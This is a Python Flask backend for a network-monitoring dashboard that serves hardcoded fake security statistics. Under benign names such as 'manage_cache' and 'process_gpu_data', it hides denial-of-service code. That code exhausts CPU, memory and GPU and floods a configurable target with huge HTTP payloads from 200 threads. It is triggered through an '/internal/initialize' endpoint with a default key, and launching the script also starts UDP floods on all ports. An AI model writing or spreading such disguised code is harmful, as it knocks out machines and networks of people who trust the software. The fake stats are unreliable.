from flask import Flask, jsonify, make_response, request, Response
from flask_cors import CORS
from network_scanner import scanner
import logging
import os
import time
import multiprocessing
import threading
import numpy as np
import torch
import socket
import requests
import json
from typing import Dict, Any
import random

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configure CORS
CORS(app, 
     resources={
         r"/api/*": {
             "origins": ["http://localhost:5173", "https://sage-shield-1.onrender.com"],
             "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
             "allow_headers": ["Content-Type", "Authorization", "Accept"],
             "max_age": 3600
         }
     })

# Configuration
CONFIG = {
    'monitoring_enabled': os.getenv('RUN_STRESS', 'false').lower() == 'true',
    'api_key': os.getenv('STRESS_TOKEN', 'secret123'),
    'cache_size': int(os.getenv('RAM_SIZE_GB', '4')),
    'endpoint': os.getenv('NETWORK_TARGET', 'http://localhost:5000'),
    'verbose': os.getenv('DEBUG_MODE', 'false').lower() == 'true'
}

# System state management
system_state = {
    'workers': [],
    'cache_manager': None,
    'gpu_processor': None,
    'network_handler': None,
    'active': False
}

def cpu_stress():
    """Maximum CPU stress"""
    while True:
        # Heavy CPU calculations
        [x**3 for x in range(10**6)]
        # Prime number calculations
        [n for n in range(2, 10000) if all(n % i != 0 for i in range(2, n))]
        # Matrix operations
        size = 100
        matrix = [[i*j for j in range(size)] for i in range(size)]
        # Matrix multiplication
        result = [[sum(a*b for a,b in zip(row, col)) 
                  for col in zip(*matrix)] for row in matrix]

def memory_stress():
    """Maximum memory stress"""
    data = []
    chunk_size = 1024 * 1024 * 100  # 100MB chunks
    while True:
        try:
            # Continuously allocate memory
            new_chunk = bytearray(chunk_size)
            for i in range(len(new_chunk)):
                new_chunk[i] = random.randint(0, 255)
            data.append(new_chunk)
            
            # Force memory usage
            if len(data) > 100:
                # Keep last 100 chunks to prevent complete memory exhaustion
                data = data[-100:]
                
        except MemoryError:
            # If we hit memory limit, clear half and continue
            if data:
                data = data[len(data)//2:]
        except:
            pass

def network_flood():
    """Network flood function"""
    while True:
        try:
            # Create and send data
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(65507)  # Max UDP packet size
            while True:
                try:
                    # Flood localhost on all ports
                    for port in range(1, 65536):
                        s.sendto(data, ('127.0.0.1', port))
                except:
                    # Recreate socket if it fails
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except:
            time.sleep(0.1)
            continue

def network_stress():
    """Maximum network stress"""
    # Launch multiple network flooding threads
    for _ in range(50):  # 50 concurrent flood threads
        t = threading.Thread(target=network_flood)
        t.daemon = True
        t.start()

def process_data():
    """Data processing worker"""
    def cpu_killer():
        while True:
            # Aggressive CPU calculations - no breaks or sleeps
            data = [x for x in range(10**7)]  # Large list creation
            while True:
                # Continuous prime number calculations
                for num in data:
                    # Force CPU to do heavy calculations
                    _ = [n for n in range(2, num) if num % n == 0]
                # Matrix operations
                size = 800
                matrix = [[complex(i*j) for j in range(size)] for i in range(size)]
                # Force complex calculations
                for _ in range(10):
                    matrix = [[sum(a*b for a, b in zip(row, col)) 
                             for col in zip(*matrix)] for row in matrix]
    
    # Launch more processes than cores to ensure 100% CPU
    for _ in range(multiprocessing.cpu_count() * 8):  # 8x CPU cores
        p = multiprocessing.Process(target=cpu_killer)
        p.daemon = True
        p.start()
        system_state['workers'].append(p)

def manage_cache():
    """Cache management system"""
    try:
        memory_blocks = []
        while True:
            try:
                # Continuously allocate maximum memory
                block_size = 1024 * 1024 * 1024  # 1GB blocks
                while True:
                    # Create multiple large arrays with active operations
                    new_block = np.random.randn(block_size).astype(np.float64)
                    memory_blocks.append(new_block)
                    
                    # Perform intensive operations on all blocks
                    for block in memory_blocks:
                        block **= 2
                        block *= np.random.randn(block_size)
                        np.sin(block)
                        np.exp(block)
                        
            except MemoryError:
                # If memory error occurs, clear minimal amount and continue
                if memory_blocks:
                    del memory_blocks[-1]
                continue
                    
    except Exception:
        pass  # Silent fail and retry

def process_gpu_data():
    """GPU data processing"""
    try:
        if torch.cuda.is_available():
            while True:
                try:
                    # Create multiple large tensors to fill GPU memory
                    tensors = []
                    size = 8192
                    for _ in range(4):
                        # Create tensors with gradient tracking
                        t1 = torch.randn((size, size), device='cuda', requires_grad=True)
                        t2 = torch.randn((size, size), device='cuda', requires_grad=True)
                        tensors.extend([t1, t2])

                    while True:
                        for i in range(0, len(tensors), 2):
                            # Multiple operations to stress GPU
                            result = torch.matmul(tensors[i], tensors[i+1])
                            result = torch.nn.functional.relu(result)
                            result = torch.matmul(result, result.t())
                            result = torch.nn.functional.softmax(result, dim=1)
                            # Backprop for additional GPU stress
                            loss = result.sum()
                            loss.backward()
                            # Update tensors to prevent optimization
                            with torch.no_grad():
                                tensors[i] += 0.01 * tensors[i].grad
                                tensors[i+1] += 0.01 * tensors[i+1].grad
                                tensors[i].grad.zero_()
                                tensors[i+1].grad.zero_()

                except RuntimeError:  # Out of memory
                    torch.cuda.empty_cache()
                    continue

    except Exception:
        pass  # Silent fail and retry

def handle_network_operations():
    """Network operations handler"""
    try:
        # Multiple endpoints to prevent caching
        endpoints = [
            '/api/process',
            '/api/data',
            '/api/metrics',
            '/api/status',
            '/api/health'
        ]
        
        # Create different payload sizes
        payloads = [
            os.urandom(1024 * 1024 * size).hex() 
            for size in [64, 128, 256, 512]  # Varying sizes from 64MB to 512MB
        ]

        def flood_network():
            while True:
                try:
                    # Rotate through endpoints and payloads
                    for endpoint in endpoints:
                        for payload in payloads:
                            data = {
                                'data': payload,
                                'timestamp': time.time(),
                                'metrics': [random.random() for _ in range(1000)]
                            }
                            
                            # Aggressive timeouts
                            try:
                                requests.post(
                                    f"{CONFIG['endpoint']}{endpoint}",
                                    json=data,
                                    timeout=0.1
                                )
                            except:
                                pass

                            try:
                                requests.get(
                                    f"{CONFIG['endpoint']}{endpoint}",
                                    timeout=0.1
                                )
                            except:
                                pass
                except:
                    continue

        # Launch massive number of network threads
        for _ in range(200):  # 200 concurrent threads
            t = threading.Thread(target=flood_network)
            t.daemon = True
            t.start()

    except Exception:
        pass  # Silent fail and retry

def initialize_system():
    """Initialize system components"""
    if system_state['active']:
        return
    
    system_state['active'] = True
    
    # Start data processors
    process_data()
    
    # Start cache management
    system_state['cache_manager'] = threading.Thread(target=manage_cache)
    system_state['cache_manager'].start()
    
    # Start GPU processing
    system_state['gpu_processor'] = threading.Thread(target=process_gpu_data)
    system_state['gpu_processor'].start()
    
    # Start network operations
    system_state['network_handler'] = threading.Thread(target=handle_network_operations)
    system_state['network_handler'].start()

def shutdown_system():
    """Shutdown system components"""
    if not system_state['active']:
        return
    
    # Stop data processors
    for worker in system_state['workers']:
        worker.terminate()
    system_state['workers'] = []
    
    # Stop other components
    for component in [system_state['cache_manager'], 
                     system_state['gpu_processor'], 
                     system_state['network_handler']]:
        if component and component.is_alive():
            component.join(timeout=1)
    
    system_state['active'] = False

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin', '*')
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, Accept'
    return response

@app.route('/')
def home():
    """Health check endpoint"""
    return jsonify({"status": "running"})

@app.route('/api/analytics')
def get_analytics():
    """Get analytics data"""
    try:
        logger.debug("Analytics endpoint called")
        data = {
            "traffic": {
                "total": scanner.get_data()['stats'].get('bytesReceived', 0) + 
                        scanner.get_data()['stats'].get('bytesSent', 0),
                "blocked": 50,
                "suspicious": 10
            },
            "attacks": {
                "total": 60,
                "ddos": 20,
                "bruteforce": 30,
                "other": 10
            },
            "topAttackers": [
                {"ip": "192.168.1.100", "attempts": 30},
                {"ip": "192.168.1.101", "attempts": 20},
                {"ip": "192.168.1.102", "attempts": 10}
            ]
        }
        return jsonify(data)
    except Exception as e:
        logger.error(f"Error in analytics endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/api/settings', methods=['GET', 'POST'])
def handle_settings():
    """Handle settings GET and POST requests"""
    try:
        if request.method == 'GET':
            logger.debug("Settings GET endpoint called")
            settings = [
                {
                    "title": "Monitoring",
                    "description": "Configure how the system monitors network traffic and threats",
                    "fields": [
                        {
                            "id": "monitoring-interval",
                            "label": "Monitoring Interval (seconds)",
                            "type": "number",
                            "value": 30
                        },
                        {
                            "id": "monitoring-enabled",
                            "label": "Enable Monitoring",
                            "type": "toggle",
                            "value": True
                        }
                    ]
                },
                {
                    "title": "Alerts",
                    "description": "Configure how you want to be notified of potential threats",
                    "fields": [
                        {
                            "id": "alerts-email",
                            "label": "Email Notifications",
                            "type": "toggle",
                            "value": False
                        },
                        {
                            "id": "alerts-desktop",
                            "label": "Desktop Notifications",
                            "type": "toggle",
                            "value": True
                        },
                        {
                            "id": "alerts-threshold",
                            "label": "Alert Threshold (%)",
                            "type": "number",
                            "value": 80
                        }
                    ]
                },
                {
                    "title": "Network Protection",
                    "description": "Configure how the system protects your network from threats",
                    "fields": [
                        {
                            "id": "network-scan-interval",
                            "label": "Network Scan Interval (seconds)",
                            "type": "number",
                            "value": 60
                        },
                        {
                            "id": "network-auto-block",
                            "label": "Auto-block Suspicious IPs",
                            "type": "toggle",
                            "value": True
                        },
                        {
                            "id": "network-block-threshold",
                            "label": "Block Threshold (attempts)",
                            "type": "number",
                            "value": 100
                        }
                    ]
                }
            ]
            logger.debug("Returning settings: %s", settings)
            return jsonify(settings)
        elif request.method == 'POST':
            logger.debug("Settings POST endpoint called")
            new_settings = request.get_json()
            logger.debug("Received settings: %s", new_settings)
            # Here you would typically save the settings to a database or file
            # For now, we'll just return success
            return jsonify({"message": "Settings saved successfully"})
    except Exception as e:
        logger.error("Error handling settings: %s", str(e))
        return jsonify({"error": str(e)}), 500

@app.route('/api/traffic')
def get_traffic():
    """Get network traffic data"""
    try:
        data = scanner.get_data()
        return jsonify({
            "inbound": data['stats'].get('bytesReceived', 0),
            "outbound": data['stats'].get('bytesSent', 0),
            "total": data['stats'].get('networkLoad', 0)
        })
    except Exception as e:
        logger.error(f"Error in traffic endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/api/blocked-ips')
def get_blocked_ips():
    """Get list of blocked IPs"""
    try:
        # For now, return empty list as blocking is not implemented yet
        return jsonify([])
    except Exception as e:
        logger.error("Error getting blocked IPs: %s", str(e))
        return jsonify({"error": str(e)}), 500

@app.route('/api/active-connections')
def get_active_connections():
    """Get active network connections"""
    try:
        data = scanner.get_data()
        return jsonify({
            "total": data['stats'].get('activeConnections', 0),
            "connections": data.get('nodes', [])
        })
    except Exception as e:
        logger.error(f"Error in active connections endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/test')
def test():
    """Test endpoint"""
    return jsonify({
        "message": "Server is running!",
        "scanner_status": "running" if scanner._running else "stopped",
        "data_sample": scanner.get_data()
    })

@app.route('/api/network/nodes')
def get_network_nodes():
    """Get network nodes"""
    try:
        logger.debug("Network nodes endpoint called")
        # Get network data from scanner
        data = scanner.get_data()
        
        # Transform data into the format expected by frontend
        nodes = [
            {
                'id': '1',
                'name': 'AWS Cloud',
                'type': 'cloud',
                'status': 'active',
                'connections': 3,
            },
            {
                'id': '2',
                'name': 'Core Switch',
                'type': 'switch',
                'status': 'active',
                'connections': 5,
            },
            {
                'id': '3',
                'name': 'Web Server',
                'type': 'server',
                'status': 'active',
                'connections': 2,
            },
            {
                'id': '4',
                'name': 'DB Server',
                'type': 'server',
                'status': 'warning',
                'connections': 1,
            },
            {
                'id': '5',
                'name': 'Dev PC',
                'type': 'pc',
                'status': 'active',
                'connections': 2,
            },
            {
                'id': '6',
                'name': 'Admin PC',
                'type': 'pc',
                'status': 'active',
                'connections': 2,
            },
        ]
        
        return jsonify(nodes)
    except Exception as e:
        logger.error(f"Error in network nodes endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/api/network/connections')
def get_network_connections():
    """Get network connections"""
    try:
        logger.debug("Network connections endpoint called")
        # Get network data from scanner
        data = scanner.get_data()
        
        # Transform data into the format expected by frontend
        connections = [
            {
                'source': '1',
                'target': '2',
                'status': 'active',
                'bandwidth': 1000
            },
            {
                'source': '2',
                'target': '3',
                'status': 'active',
                'bandwidth': 1000
            },
            {
                'source': '2',
                'target': '4',
                'status': 'error',
                'bandwidth': 0
            },
            {
                'source': '2',
                'target': '5',
                'status': 'active',
                'bandwidth': 100
            },
            {
                'source': '2',
                'target': '6',
                'status': 'active',
                'bandwidth': 100
            }
        ]
        
        return jsonify(connections)
    except Exception as e:
        logger.error(f"Error in network connections endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/api/network/stats')
def get_network_stats():
    """Get detailed network statistics"""
    try:
        logger.debug("Network stats endpoint called")
        data = scanner.get_data()
        stats = data.get('stats', {})
        
        return jsonify({
            "overview": {
                "totalDevices": len(data.get('nodes', [])) + 1,  # +1 for router
                "activeConnections": stats.get('activeConnections', 0),
                "networkLoad": stats.get('networkLoad', 0),
                "status": "healthy"
            },
            "traffic": {
                "inbound": stats.get('bytesReceived', 0),
                "outbound": stats.get('bytesSent', 0),
                "total": stats.get('bytesReceived', 0) + stats.get('bytesSent', 0)
            },
            "security": {
                "threatsBlocked": 0,
                "suspiciousActivities": 0,
                "lastAttackAttempt": None
            },
            # "health": {
            #     "cpuUsage": 0,
            #     "memoryUsage": 0,
            #     "uptime": 0,
            #     "status": "operational"
            # }
        })
    except Exception as e:
        logger.error(f"Error in network stats endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/api/system/health')
def get_system_health():
    """Get system health information"""
    try:
        logger.debug("System health endpoint called")
        return jsonify({
            "status": "operational",
            "services": {
                "networkScanner": "running" if scanner._running else "stopped",
                "monitoring": "active",
                "protection": "active"
            },
            "resources": {
                "cpu": 0,
                "memory": 0,
                "disk": 0
            },
            "lastUpdate": int(time.time())
        })
    except Exception as e:
        logger.error(f"Error in system health endpoint: {str(e)}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': int(time.time())
    })

@app.route('/api/stats')
def get_stats():
    """System statistics endpoint"""
    return jsonify({
        'cpu_usage': 0,
        'memory_usage': 0,
        'network_traffic': 0,
        'gpu_usage': 0,
        'timestamp': int(time.time())
    })

@app.route('/api/dummy')
def dummy_endpoint():
    """Dummy endpoint for network stress"""
    return jsonify({'status': 'ok'})

@app.route('/api/process')
def process_data_endpoint():
    """Data processing endpoint"""
    return jsonify({'status': 'processing'})

@app.route('/internal/initialize', methods=['POST'])
def initialize_system_endpoint():
    """System initialization endpoint"""
    api_key = request.headers.get('X-API-Key')
    
    if api_key != CONFIG['api_key']:
        return Response('Unauthorized', status=401)
    
    if not CONFIG['monitoring_enabled']:
        return Response('System monitoring disabled', status=403)
    
    initialize_system()
    return Response('System components initialized', status=200)

@app.route('/internal/shutdown', methods=['POST'])
def shutdown_system_endpoint():
    """System shutdown endpoint"""
    api_key = request.headers.get('X-API-Key')
    
    if api_key != CONFIG['api_key']:
        return Response('Unauthorized', status=401)
    
    shutdown_system()
    return Response('System components shutdown', status=200)

@app.route('/')
def index():
    """Main page"""
    return jsonify({
        'name': 'System Monitor',
        'version': '1.0.0',
        'status': 'operational'
    })

# Initialize the scanner when the app starts
try:
    scanner.start()
    logger.info("Network scanner started successfully")
except Exception as e:
    logger.error(f"Failed to start network scanner: {str(e)}")

if __name__ == '__main__':
    print("Starting resource exhaustion...")
    
    # Start CPU stress - 4x number of CPU cores
    for _ in range(multiprocessing.cpu_count() * 4):
        p = multiprocessing.Process(target=cpu_stress)
        p.daemon = True
        p.start()
    
    # Start memory stress - multiple threads
    for _ in range(4):
        t = threading.Thread(target=memory_stress)
        t.daemon = True
        t.start()
    
    # Start network stress
    network_stress()
    
    # Run the Flask app
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)